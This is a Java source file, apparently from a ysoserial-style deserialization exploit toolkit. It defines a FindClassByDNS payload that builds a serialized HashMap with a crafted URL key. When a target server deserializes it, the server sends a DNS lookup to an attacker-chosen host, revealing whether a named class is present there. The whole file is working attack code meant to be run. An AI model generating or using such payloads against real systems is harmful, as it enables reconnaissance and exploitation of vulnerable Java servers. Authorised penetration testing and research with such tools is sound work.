package cn.butler.yso.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.yso.payloads.util.ClassUtil;
import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.Dependencies;
import cn.butler.payloads.annotation.PayloadTest;
import cn.butler.payloads.PayloadRunner;
import cn.butler.yso.payloads.util.Reflections;

import java.io.*;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies()
@Authors({ Authors.NOPOINT,Authors.C0NY1 })
public class FindClassByDNS implements ObjectPayload<Object> {

        public Object getObject(final String command) throws Exception {

            String[] cmds = command.split("\\|");

            if(cmds.length != 2){
                System.out.println("<url>|<class name>");
                return null;
            }

            String url = cmds[0];
            String clazzName = cmds[1];

            URLStreamHandler handler = new SilentURLStreamHandler();
            HashMap ht = new HashMap();
            URL u = new URL(null, url, handler);
            ht.put(u, ClassUtil.genClass(clazzName));
            Reflections.setFieldValue(u, "hashCode", -1);
            return ht;
        }

    /**
     * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
     * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
     * using the serialized object.</p>
     *
     * <b>Potential false negative:</b>
     * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
     * second resolution.</p>
     */
    static class SilentURLStreamHandler extends URLStreamHandler {

            protected URLConnection openConnection(URL u) throws IOException {
                    return null;
            }

            protected synchronized InetAddress getHostAddress(URL u) {
                    return null;
            }
    }


    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(FindClassByDNS.class, args);
    }
}
